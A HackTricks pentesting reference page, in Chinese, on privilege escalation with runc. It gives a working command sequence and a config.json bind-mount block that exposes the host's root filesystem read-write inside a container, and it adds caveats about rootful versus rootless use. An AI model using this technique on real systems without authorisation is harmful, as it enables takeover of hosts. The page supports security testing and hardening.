# RunC 提权

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

如果你想进一步了解 **runc**，请查看以下页面：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果主机上的 rootful 进程可以使用 `runc`，你可以使用一个 OCI bundle，其挂载配置会将主机的 `/` 递归 bind-mount 到容器内部的 `/`，从而在该 mount namespace 中暴露主机文件系统。<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 文档记录的 `runc run` workflow 是 rootful 的：runc 自身的示例将其标注为“以 root 身份运行”。非特权用户需要使用 `runc spec --rootless` 等 rootless 配置；runc 文档指出，必须启用 user namespaces 才能使用该模式。<sup>[[1]](#references)</sup>

## References

- [1] [runc：用于生成和运行 containers 的 CLI 工具](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification：Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Shared Subtrees](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
